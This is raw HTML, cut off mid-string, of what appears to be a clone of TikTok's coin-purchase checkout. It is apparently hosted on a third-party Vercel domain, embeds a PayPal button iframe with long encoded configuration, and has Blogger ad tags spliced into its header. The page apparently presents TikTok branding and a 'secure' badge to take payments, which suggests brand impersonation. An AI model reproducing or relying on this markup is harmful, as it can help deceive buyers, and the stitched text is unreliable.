id="Icon-Shield_Tick_svg__a"><path d="M0 0h48v48H0z"></path></clipPath></defs></svg></span><span class="tiktok-1gu77br-TextContainer eblccp10 mt-2" style="margin-inline:4px">Your info is private and secure.</span></div><meta content="ca-host-pub-1556223355139109" name="google-adsense-platform-account"><meta content="blogspot.com" name="google-adsense-platform-domain"><link href="https://www.blogger.com/profile/00007929653765726731" rel="me"><meta content="ca-host-pub-1556223355139109" name="google-adsense-platform-account"><meta content="blogspot.com" name="google-adsense-platform-domain"><link href="https://www.blogger.com/profile/16642332466016559934" rel="me"><meta content="ca-host-pub-1556223355139109" name="google-adsense-platform-account"><meta content="blogspot.com" name="google-adsense-platform-domain"><link href="https://www.blogger.com/profile/11013980442112774925" rel="me"><meta content="ca-host-pub-1556223355139109" name="google-adsense-platform-account"><meta content="blogspot.com" name="google-adsense-platform-domain"></header><div class="tiktok-197anyc-DivProfileRow ed1ryg42"><span class="tiktok-1ewhav3-SpanProfileDescription ed1ryg43" data-e2e="cashier-account-title">Account</span><div class="tiktok-1vchfa7-DivProfileInfo ed1ryg44"><div aria-controls="" aria-haspopup="true" class="tiktok-15iwytd-DivProfileContainer efubjyv0" data-e2e="profile-icon" role="button" tabindex="0"></div><span class="tiktok-1nnllx5-SpanProfileUsername ed1ryg45" data-e2e="cashier-user-name" id="user-name">EDGFF</span></div></div><div class="tiktok-q8zfnj-DivOrderDetails ed1ryg46"><div class="tiktok-19zzxh7-DivOrderSummaryContent ed1ryg41" data-e2e="cashier-coins-price"><span id="lastStep-coin">555,555 Coins</span><span id="total2">$ 111.11</span></div><div class="tiktok-1kkzega-DivOrderSummaryContent ed1ryg41" data-e2e="cashier-total-price"><span>Total</span><span id="total3">$ 111.11</span></div></div><div class="tiktok-qov981-DivLoadingWrapper eezq8x00"><div data-theme="light" dir="ltr"><div class="pipo pipo-pc pc-payment" data-sel="pipo-pc-payment-methods-wrapper" style="direction:ltr"><form><div class="pc-payment-container"><div class="pc-payment-header"><div class="arco-row arco-row-align-center arco-row-justify-center"><div class="arco-statistic"><div class="arco-statistic-content"><div class="arco-statistic-value" style="color:var(--pipo-pc-color-text-primary);font-size:var(--pipo-pc-font-size-display-primary);font-weight:var(--pipo-pc-font-weight-title)"></div></div></div></div><div class="pc-payment-header-divider"></div></div><div class="pc-payment-list"><div class="pc-payment-list-title text-center"><span>Select a payment method</span></div></div><div><div class="mt-3 d-flex justify-content-center"><div id="root" style="width:400px"><div id="paypal-button"><div class="paypal-buttons paypal-buttons-context-iframe paypal-buttons-label-unknown paypal-buttons-layout-vertical" data-paypal-smart-button-version="5.0.510" id="zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu" style="height: 0px; transition: all 0.2s ease-in-out 0s;"><style nonce="">
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu {
+                        position: relative;
+                        display: inline-block;
+                        width: 5%;
+                        min-height: 35px;
+                        min-width: 200px;
+                        font-size: 0;
+                    }
+
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu > iframe {
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                    }
+
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu > iframe.component-frame {
+                        z-index: 100;
+                    }
+
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu > iframe.prerender-frame {
+                        transition: opacity .2s linear;
+                        z-index: 200;
+                    }
+
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu > iframe.visible {
+                        opacity: 1;
+                    }
+
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu > iframe.invisible {
+                        opacity: 0;
+                        pointer-events: none;
+                    }
+
+                    #zoid-paypal-buttons-uid_e624eb057b_mda6mjg6mzu > .smart-menu {
+                        position: absolute;
+                        z-index: 300;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                    }
+                </style><iframe allowpaymentrequest="allowpaymentrequest" allowtransparency="true" class="component-frame visible" id="jsx-iframe-234a119eb3" name="__zoid__paypal_buttons__eyJzZW5kZXIiOnsiZG9tYWluIjoiaHR0cHM6Ly90aWt0b2stcmVhY3QudmVyY2VsLmFwcCJ9LCJtZXRhRGF0YSI6eyJ3aW5kb3dSZWYiOnsidHlwZSI6InBhcmVudCIsImRpc3RhbmNlIjowfX0sInJlZmVyZW5jZSI6eyJ0eXBlIjoicmF3IiwidmFsIjoie1widWlkXCI6XCJ6b2lkLXBheXBhbC1idXR0b25zLXVpZF9lNjI0ZWIwNTdiX21kYTZtamc2bXp1XCIsXCJjb250ZXh0XCI6XCJpZnJhbWVcIixcInRhZ1wiOlwicGF5cGFsLWJ1dHRvbnNcIixcImNoaWxkRG9tYWluTWF0Y2hcIjp7XCJfX3R5cGVfX1wiOlwicmVnZXhcIixcIl9fdmFsX19cIjpcIlxcXFwucGF5cGFsXFxcXC4oY29tfGNuKSg6XFxcXGQrKT8kXCJ9LFwidmVyc2lvblwiOlwiMTBfNF8wXCIsXCJwcm9wc1wiOntcImNyZWF0ZU9yZGVyXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfYzVlMGRlMTc1NF9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwiY3JlYXRlT3JkZXJcIn19LFwib25BcHByb3ZlXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfZjcwYzEzNjk0OF9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwib25BcHByb3ZlXCJ9fSxcImNzcE5vbmNlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImFwcFN3aXRjaFdoZW5BdmFpbGFibGVcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwic2hvd1BheVBhbEFwcFN3aXRjaE92ZXJsYXlcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF9iNmQxZmFlMzU3X21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJzaG93UGF5UGFsQXBwU3dpdGNoT3ZlcmxheVwifX0sXCJoaWRlUGF5UGFsQXBwU3dpdGNoT3ZlcmxheVwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkX2Y2NzlkZjE2YmZfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcImhpZGVQYXlQYWxBcHBTd2l0Y2hPdmVybGF5XCJ9fSxcInJlZGlyZWN0XCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfODc0OGJjYjUxOF9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwicmVkaXJlY3RcIn19LFwibGlzdGVuRm9ySGFzaENoYW5nZXNcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF9kMzExNzU4ZTZiX21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJsaXN0ZW5Gb3JIYXNoQ2hhbmdlc1wifX0sXCJyZW1vdmVMaXN0ZW5lckZvckhhc2hDaGFuZ2VzXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfZjcwMDU5MTM1YV9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwicmVtb3ZlTGlzdGVuZXJGb3JIYXNoQ2hhbmdlc1wifX0sXCJsaXN0ZW5Gb3JWaXNpYmlsaXR5Q2hhbmdlXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfNmZiNzA0MTM2N19tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwibGlzdGVuRm9yVmlzaWJpbGl0eUNoYW5nZVwifX0sXCJyZW1vdmVMaXN0ZW5lckZvclZpc2liaWxpdHlDaGFuZ2VzXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfMWVlNjA0NDNiNl9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwicmVtb3ZlTGlzdGVuZXJGb3JWaXNpYmlsaXR5Q2hhbmdlc1wifX0sXCJhbGxvd0JpbGxpbmdQYXltZW50c1wiOnRydWUsXCJhbW91bnRcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwiYXBpU3RhZ2VIb3N0XCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImFwcGxlUGF5XCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImFwcGxlUGF5U3VwcG9ydFwiOmZhbHNlLFwiYnJhbmRlZFwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJidXR0b25Mb2NhdGlvblwiOlwidGlrdG9rLXJlYWN0LnZlcmNlbC5hcHBcIixcImJ1dHRvblNlc3Npb25JRFwiOlwidWlkXzYyMzFlMGI0ZGRfbWRhNm1qZzZtenVcIixcImJ1dHRvblNpemVcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwiYnV5ZXJDb3VudHJ5XCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImNsaWVudEFjY2Vzc1Rva2VuXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImN1c3RvbWVySWRcIjpcIlwiLFwiY2xpZW50SURcIjpcIkFkZFgwdVJVTnZHVVhWcnNySE9CRVRxZW43TE5ZV3lrcjhiMlYzejBOOGt5UEFQWFRpNG5PRmN1WlIzdHZSOWo0WDFiVkRxMnJES254QlFRXCIsXCJjbGllbnRNZXRhZGF0YUlEXCI6XCJ1aWRfMzJjNWZlYTU4OF9tZGE2bWpxNm50bVwiLFwiY29tbWl0XCI6dHJ1ZSxcImNvbXBvbmVudHNcIjpbXCJidXR0b25zXCJdLFwiY3JlYXRlQmlsbGluZ0FncmVlbWVudFwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJjcmVhdGVTdWJzY3JpcHRpb25cIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwiY3JlYXRlVmF1bHRTZXR1cFRva2VuXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImNzcFwiOntcIm5vbmNlXCI6XCJcIn0sXCJjdXJyZW5jeVwiOlwiVVNEXCIsXCJkZWJ1Z1wiOmZhbHNlLFwiZGlzYWJsZUNhcmRcIjpbXSxcImRpc2FibGVGdW5kaW5nXCI6W10sXCJkaXNhYmxlU2V0Q29va2llXCI6dHJ1ZSxcImRpc3BsYXlPbmx5XCI6W10sXCJlYWdlck9yZGVyQ3JlYXRpb25cIjpmYWxzZSxcImVuYWJsZUZ1bmRpbmdcIjpbXSxcImVuYWJsZVRocmVlRG9tYWluU2VjdXJlXCI6ZmFsc2UsXCJlbmFibGVWYXVsdFwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJlbnZcIjpcInByb2R1Y3Rpb25cIixcImV4cGVyaW1lbnRcIjp7XCJlbmFibGVWZW5tb1wiOmZhbHNlLFwidmVubW9WYXVsdFdpdGhvdXRQdXJjaGFzZVwiOmZhbHNlLFwic3BiRWFnZXJPcmRlckNyZWF0aW9uXCI6ZmFsc2UsXCJ2ZW5tb1dlYkVuYWJsZWRcIjpmYWxzZSxcImlzV2ViVmlld0VuYWJsZWRcIjpmYWxzZSxcImlzUGF5cGFsUmVicmFuZEVuYWJsZWRcIjpmYWxzZSxcImlzUGF5cGFsUmVicmFuZEFCVGVzdEVuYWJsZWRcIjpmYWxzZSxcImRlZmF1bHRCbHVlQnV0dG9uQ29sb3JcIjpcImdvbGRcIixcInZlbm1vRW5hYmxlV2ViT25Ob25OYXRpdmVCcm93c2VyXCI6ZmFsc2V9LFwiZXhwZXJpbWVudGF0aW9uXCI6e30sXCJmbG93XCI6XCJwdXJjaGFzZVwiLFwiZnVuZGluZ0VsaWdpYmlsaXR5XCI6e1wicGF5cGFsXCI6e1wiZWxpZ2libGVcIjp0cnVlLFwidmF1bHRhYmxlXCI6ZmFsc2V9LFwicGF5bGF0ZXJcIjp7XCJlbGlnaWJsZVwiOmZhbHNlLFwidmF1bHRhYmxlXCI6ZmFsc2UsXCJwcm9kdWN0c1wiOntcInBheUluM1wiOntcImVsaWdpYmxlXCI6ZmFsc2UsXCJ2YXJpYW50XCI6bnVsbH0sXCJwYXlJbjRcIjp7XCJlbGlnaWJsZVwiOmZhbHNlLFwidmFyaWFudFwiOm51bGx9LFwicGF5bGF0ZXJcIjp7XCJlbGlnaWJsZVwiOmZhbHNlLFwidmFyaWFudFwiOm51bGx9fX0sXCJjYXJkXCI6e1wiZWxpZ2libGVcIjp0cnVlLFwiYnJhbmRlZFwiOnRydWUsXCJpbnN0YWxsbWVudHNcIjpmYWxzZSxcInZlbmRvcnNcIjp7XCJ2aXNhXCI6e1wiZWxpZ2libGVcIjp0cnVlLFwidmF1bHRhYmxlXCI6dHJ1ZX0sXCJtYXN0ZXJjYXJkXCI6e1wiZWxpZ2libGVcIjp0cnVlLFwidmF1bHRhYmxlXCI6dHJ1ZX0sXCJhbWV4XCI6e1wiZWxpZ2libGVcIjp0cnVlLFwidmF1bHRhYmxlXCI6dHJ1ZX0sXCJkaXNjb3ZlclwiOntcImVsaWdpYmxlXCI6dHJ1ZSxcInZhdWx0YWJsZVwiOnRydWV9LFwiaGlwZXJcIjp7XCJlbGlnaWJsZVwiOmZhbHNlLFwidmF1bHRhYmxlXCI6ZmFsc2V9LFwiZWxvXCI6e1wiZWxpZ2libGVcIjpmYWxzZSxcInZhdWx0YWJsZVwiOnRydWV9LFwiamNiXCI6e1wiZWxpZ2libGVcIjpmYWxzZSxcInZhdWx0YWJsZVwiOnRydWV9LFwibWFlc3Ryb1wiOntcImVsaWdpYmxlXCI6dHJ1ZSxcInZhdWx0YWJsZVwiOnRydWV9LFwiZGluZXJzXCI6e1wiZWxpZ2libGVcIjp0cnVlLFwidmF1bHRhYmxlXCI6dHJ1ZX0sXCJjdXBcIjp7XCJlbGlnaWJsZVwiOnRydWUsXCJ2YXVsdGFibGVcIjp0cnVlfSxcImNiX25hdGlvbmFsZVwiOntcImVsaWdpYmxlXCI6ZmFsc2UsXCJ2YXVsdGFibGVcIjp0cnVlfX0sXCJndWVzdEVuYWJsZWRcIjpmYWxzZX0sXCJ2ZW5tb1wiOntcImVsaWdpYmxlXCI6ZmFsc2UsXCJ2YXVsdGFibGVcIjpmYWxzZX0sXCJpdGF1XCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJjcmVkaXRcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcImFwcGxlcGF5XCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJzZXBhXCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJpZGVhbFwiOntcImVsaWdpYmxlXCI6ZmFsc2V9LFwiYmFuY29udGFjdFwiOntcImVsaWdpYmxlXCI6ZmFsc2V9LFwiZ2lyb3BheVwiOntcImVsaWdpYmxlXCI6ZmFsc2V9LFwiZXBzXCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJzb2ZvcnRcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcIm15YmFua1wiOntcImVsaWdpYmxlXCI6ZmFsc2V9LFwicDI0XCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJ3ZWNoYXRwYXlcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcInBheXVcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcImJsaWtcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcInRydXN0bHlcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcIm94eG9cIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcImJvbGV0b1wiOntcImVsaWdpYmxlXCI6ZmFsc2V9LFwiYm9sZXRvYmFuY2FyaW9cIjp7XCJlbGlnaWJsZVwiOmZhbHNlfSxcIm1lcmNhZG9wYWdvXCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJtdWx0aWJhbmNvXCI6e1wiZWxpZ2libGVcIjpmYWxzZX0sXCJzYXRpc3BheVwiOntcImVsaWdpYmxlXCI6ZmFsc2V9LFwicGFpZHlcIjp7XCJlbGlnaWJsZVwiOmZhbHNlfX0sXCJmdW5kaW5nU291cmNlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImdldFBhZ2VVcmxcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF8wMGM0ZGJmZTUyX21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJnZXRQYWdlVXJsXCJ9fSxcImdldFBvcHVwQnJpZGdlXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfMTk5M2EyNWEzMF9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwiZ2V0UG9wdXBCcmlkZ2VcIn19LFwiZ2V0UHJlcmVuZGVyRGV0YWlsc1wiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkXzU3ZGYzNGEyMTdfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcImdldFByZXJlbmRlckRldGFpbHNcIn19LFwiZ2V0UXVlcmllZEVsaWdpYmxlRnVuZGluZ1wiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkXzljYTY3ZDNjOThfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcImdldFF1ZXJpZWRFbGlnaWJsZUZ1bmRpbmdcIn19LFwiZ2xvYmFsU2Vzc2lvbklEXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImhvc3RlZEJ1dHRvbklkXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImludGVudFwiOlwiY2FwdHVyZVwiLFwianNTZGtMaWJyYXJ5XCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImxvY2FsZVwiOntcImNvdW50cnlcIjpcIlVTXCIsXCJsYW5nXCI6XCJlblwifSxcIm1lcmNoYW50SURcIjpbXSxcIm1lcmNoYW50UmVxdWVzdGVkUG9wdXBzRGlzYWJsZWRcIjpmYWxzZSxcIm1lc3NhZ2VcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwibm9uY2VcIjpcIlwiLFwib25DYW5jZWxcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwib25DbGlja1wiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJvbkNvbXBsZXRlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcIm9uSW5pdFwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkX2FlNzhjNjhlMjBfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcIm9uSW5pdFwifX0sXCJvbk1lc3NhZ2VDbGlja1wiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkX2E5YTEwN2M2OGRfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcIm9uTWVzc2FnZUNsaWNrXCJ9fSxcIm9uTWVzc2FnZUhvdmVyXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfOTJmM2Q0YzhjN19tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwib25NZXNzYWdlSG92ZXJcIn19LFwib25NZXNzYWdlUmVhZHlcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF9jNGY3ZmE4ZjkyX21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJvbk1lc3NhZ2VSZWFkeVwifX0sXCJvblNoaXBwaW5nQWRkcmVzc0NoYW5nZVwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJvblNoaXBwaW5nQ2hhbmdlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcIm9uU2hpcHBpbmdPcHRpb25zQ2hhbmdlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImhhc1NoaXBwaW5nQ2FsbGJhY2tcIjpmYWxzZSxcInBhZ2VUeXBlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInBhcnRuZXJBdHRyaWJ1dGlvbklEXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInBheW1lbnRNZXRob2ROb25jZVwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJwYXltZW50TWV0aG9kVG9rZW5cIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwicGF5bWVudFJlcXVlc3RcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwicGxhdGZvcm1cIjpcImRlc2t0b3BcIixcInJlZmVycmVyRG9tYWluXCI6XCJ3d3cuZ29vZ2xlLmNvbVwiLFwicmVtZW1iZXJcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF81OTBmYTYwYmFkX21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJyZW1lbWJlclwifX0sXCJyZW1lbWJlcmVkXCI6W10sXCJyZW5kZXJlZEJ1dHRvbnNcIjpbXCJwYXlwYWxcIixcImNhcmRcIl0sXCJzZXNzaW9uSURcIjpcInVpZF8zMmM1ZmVhNTg4X21kYTZtanE2bnRtXCIsXCJzZGtDb3JyZWxhdGlvbklEXCI6XCJwcmVidWlsZFwiLFwic2RrSW5pdFRpbWluZ3NcIjp7XCJzZGtJbml0VGltZVN0YW1wXCI6MTc1ODg0NjUxNTE1NCxcInNka1NjcmlwdERvd25sb2FkRHVyYXRpb25cIjoyMjEuNSxcImlzU2RrQ2FjaGVkXCI6XCJub1wifSxcInNka1Rva2VuXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInNlc3Npb25TdGF0ZVwiOntcImdldFwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkX2ZjY2JjNTU1MTRfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcImdldFwifX0sXCJzZXRcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF9hNGY4NTk5ZWU4X21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJzZXRcIn19fSxcInNob3BwZXJTZXNzaW9uSWRcIjpcIlwiLFwiZ2V0U2hvcHBlckluc2lnaHRzVXNlZFwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkXzMzOGZjNjU0MjNfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcIkxyXCJ9fSxcInN0YWdlSG9zdFwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJzdG9yYWdlSURcIjpcInVpZF8zZGM5YjJjMTQ0X21kZTZtZHU2bXRjXCIsXCJzdG9yYWdlU3RhdGVcIjp7XCJnZXRcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF84YjVlMWM3MGVlX21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJnZXRcIn19LFwic2V0XCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfYTE1ZDg3NDA1Zl9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwic2V0XCJ9fX0sXCJzdHlsZVwiOntcImxhYmVsXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImxheW91dFwiOlwidmVydGljYWxcIixcImNvbG9yXCI6XCJnb2xkXCIsXCJzaGFwZVwiOlwicmVjdFwiLFwidGFnbGluZVwiOmZhbHNlLFwiaGVpZ2h0XCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInBlcmlvZFwiOntcIl9fdHlwZV9fXCI6XCJ1bmRlZmluZWRcIn0sXCJtZW51UGxhY2VtZW50XCI6XCJiZWxvd1wiLFwiZGlzYWJsZU1heFdpZHRoXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcImRpc2FibGVNYXhIZWlnaHRcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwiYm9yZGVyUmFkaXVzXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInNob3VsZEFwcGx5UmVicmFuZGVkU3R5bGVzXCI6ZmFsc2UsXCJpc0J1dHRvbkNvbG9yQUJUZXN0TWVyY2hhbnRcIjpmYWxzZX0sXCJidXR0b25Db2xvclwiOntcInNob3VsZEFwcGx5UmVicmFuZGVkU3R5bGVzXCI6ZmFsc2UsXCJjb2xvclwiOlwiZ29sZFwiLFwiaXNCdXR0b25Db2xvckFCVGVzdE1lcmNoYW50XCI6ZmFsc2V9LFwic3VwcG9ydGVkTmF0aXZlQnJvd3NlclwiOmZhbHNlLFwic3VwcG9ydHNQb3B1cHNcIjp0cnVlLFwidGVzdFwiOntcImFjdGlvblwiOlwiY2hlY2tvdXRcIn0sXCJ1c2VyRXhwZXJpZW5jZUZsb3dcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwidXNlcklEVG9rZW5cIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwic2RrU291cmNlXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInZhdWx0XCI6ZmFsc2UsXCJ3YWxsZXRcIjp7XCJfX3R5cGVfX1wiOlwidW5kZWZpbmVkXCJ9LFwiaGlkZVN1Ym1pdEJ1dHRvbkZvckNhcmRGb3JtXCI6e1wiX190eXBlX19cIjpcInVuZGVmaW5lZFwifSxcInVzZXJBZ2VudFwiOlwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjAuMCBTYWZhcmkvNTM3LjM2XCJ9LFwiZXhwb3J0c1wiOntcImluaXRcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF9kOGFiZGUzNTI0X21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJpbml0XCJ9fSxcImNsb3NlXCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192YWxfX1wiOntcImlkXCI6XCJ1aWRfN2NiMmY4NjZhNl9tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwiY2xvc2U6Om1lbW9pemVkXCJ9fSxcImNoZWNrQ2xvc2VcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF82OTNhMDUzZjI4X21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJjaGVja0Nsb3NlXCJ9fSxcInJlc2l6ZVwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkX2I4ODExY2Y2ZjZfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcInhuXCJ9fSxcIm9uRXJyb3JcIjp7XCJfX3R5cGVfX1wiOlwiY3Jvc3NfZG9tYWluX2Z1bmN0aW9uXCIsXCJfX3ZhbF9fXCI6e1wiaWRcIjpcInVpZF85YjNlYWNiZDk1X21kYTZtamc2bXp1XCIsXCJuYW1lXCI6XCJrblwifX0sXCJzaG93XCI6e1wiX190eXBlX19cIjpcImNyb3NzX2RvbWFpbl9mdW5jdGlvblwiLFwiX192Y